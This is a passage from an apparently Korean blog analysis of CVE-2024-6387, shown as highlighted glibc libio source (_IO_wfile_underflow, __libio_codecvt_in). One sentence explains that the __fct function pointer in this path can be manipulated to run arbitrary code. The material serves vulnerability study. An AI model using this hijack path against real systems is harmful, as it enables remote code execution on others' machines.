  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_EOF_SEEN</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="n">cd</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_codecvt</span><span class="p">;</span>

  <span class="cm">/* Maybe there is something left in the external buffer.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* There is more in the external.  Convert it.  */</span>
      <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">read_stop</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_last_state</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
      <span class="n">status</span> <span class="o">=</span> <span class="n">__libio_codecvt_in</span> <span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">,</span>
				   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span>
				   <span class="o">&amp;</span><span class="n">read_stop</span><span class="p">,</span>
				   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span>
				   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">,</span>
				   <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">read_stop</span><span class="p">;</span>

      <span class="cm">/* If we managed to generate some text return the next character.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
	<span class="k">return</span> <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">__codecvt_error</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EILSEQ</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
	  <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="cm">/* Move the remaining content of the read buffer to the beginning.  */</span>
      <span class="n">memmove</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span>
	       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">);</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
			  <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">));</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">else</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="cm">/* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">((</span><span class="n">stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>

      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">read_ptr_copy</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">accbuf</span><span class="p">[</span><span class="n">MB_LEN_MAX</span><span class="p">];</span>
  <span class="kt">size_t</span> <span class="n">naccbuf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="nl">again:</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">naccbuf</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
	<span class="cm">/* There are some bytes in the external buffer but they don't
	   convert to anything.  */</span>
	<span class="n">__set_errno</span> <span class="p">(</span><span class="n">EILSEQ</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>

  <span class="cm">/* Now convert the read input.  */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_last_state</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">to</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">to_copy</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">to_copy</span> <span class="o">=</span> <span class="n">MIN</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">)</span> <span class="o">-</span> <span class="n">naccbuf</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">to</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">accbuf</span><span class="p">[</span><span class="n">naccbuf</span><span class="p">],</span> <span class="n">from</span><span class="p">,</span> <span class="n">to_copy</span><span class="p">);</span>
      <span class="n">naccbuf</span> <span class="o">+=</span> <span class="n">to_copy</span><span class="p">;</span>
      <span class="n">from</span> <span class="o">=</span> <span class="n">accbuf</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">status</span> <span class="o">=</span> <span class="n">__libio_codecvt_in</span> <span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">,</span>
			       <span class="n">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_ptr_copy</span><span class="p">,</span>
			       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span>
			       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">,</span>
			       <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">MAX</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">read_ptr_copy</span> <span class="o">-</span> <span class="o">&amp;</span><span class="n">accbuf</span><span class="p">[</span><span class="n">naccbuf</span> <span class="o">-</span> <span class="n">to_copy</span><span class="p">]);</span>
  <span class="k">else</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">read_ptr_copy</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">__codecvt_error</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="nl">out_eilseq:</span>
	  <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EILSEQ</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
	  <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="cm">/* The read bytes make no complete character.  Try reading again.  */</span>
      <span class="n">assert</span> <span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">__codecvt_partial</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="cm">/* Partially used the buffer for some input data that
		 produces no output.  */</span>
	      <span class="kt">size_t</span> <span class="n">avail</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	      <span class="n">memmove</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">avail</span><span class="p">);</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-=</span> <span class="n">avail</span><span class="p">;</span>
	      <span class="k">goto</span> <span class="n">again</span><span class="p">;</span>
	    <span class="p">}</span>
	  <span class="n">naccbuf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">&gt;=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">))</span>
	    <span class="k">goto</span> <span class="n">out_eilseq</span><span class="p">;</span>

	  <span class="n">memcpy</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">naccbuf</span><span class="p">);</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="p">{</span>
	  <span class="kt">size_t</span> <span class="n">used</span> <span class="o">=</span> <span class="n">read_ptr_copy</span> <span class="o">-</span> <span class="n">accbuf</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">used</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="n">memmove</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">,</span> <span class="n">read_ptr_copy</span><span class="p">,</span> <span class="n">naccbuf</span> <span class="o">-</span> <span class="n">used</span><span class="p">);</span>
	      <span class="n">naccbuf</span> <span class="o">-=</span> <span class="n">used</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">==</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">))</span>
	    <span class="k">goto</span> <span class="n">out_eilseq</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>

      <span class="k">goto</span> <span class="n">again</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wfile_underflow</span><span class="p">)</span>
</code></pre></div> </div> </div> </details> <p><code class="language-plaintext highlighter-rouge">_IO_wfile_underflow</code>는 다음 흐름을 갖는데 이때 <code class="language-plaintext highlighter-rouge">__fct</code> 함수 포인터를 조작할 수 있기 때문에 원하는 코드를 실행시킬 수 있습니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph4.png" /></p> <details> <summary>libio/iofwide.c</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">__codecvt_result</span>
<span class="nf">__libio_codecvt_in</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">codecvt</span><span class="p">,</span> <span class="n">__mbstate_t</span> <span class="o">*</span><span class="n">statep</span><span class="p">,</span>
		    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from_start</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from_end</span><span class="p">,</span>
		    <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">from_stop</span><span class="p">,</span>
		    <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">to_start</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">to_end</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">**</span><span class="n">to_stop</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">enum</span> <span class="n">__codecvt_result</span> <span class="n">result</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="n">gs</span> <span class="o">=</span> <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">status</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">dummy</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from_start_copy</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">from_start</span><span class="p">;</span>

  <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__outbuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">to_start</span><span class="p">;</span>
  <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__outbufend</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">to_end</span><span class="p">;</span>
  <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__statep</span> <span class="o">=</span> <span class="n">statep</span><span class="p">;</span>

  <span class="n">__gconv_fct</span> <span class="n">fct</span> <span class="o">=</span> <span class="n">gs</span><span class="o">-&gt;</span><span class="n">__fct</span><span class="p">;</span>
<span class="cp">#ifdef PTR_DEMANGLE
</span>  <span class="k">if</span> <span class="p">(</span><span class="n">gs</span><span class="o">-&gt;</span><span class="n">__shlib_handle</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">fct</span><span class="p">);</span>
<span class="cp">#endif
</span>
  <span class="n">status</span> <span class="o">=</span> <span class="n">DL_CALL_FCT</span> <span class="p">(</span><span class="n">fct</span><span class="p">,</span>
			<span class="p">(</span><span class="n">gs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">from_start_copy</span><span class="p">,</span>
			 <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">from_end</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
			 <span class="o">&amp;</span><span class="n">dummy</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>

  <span class="o">*</span><span class="n">from_stop</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">from_start_copy</span><span class="p">;</span>
  <span class="o">*</span><span class="n">to_stop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__outbuf</span><span class="p">;</span>
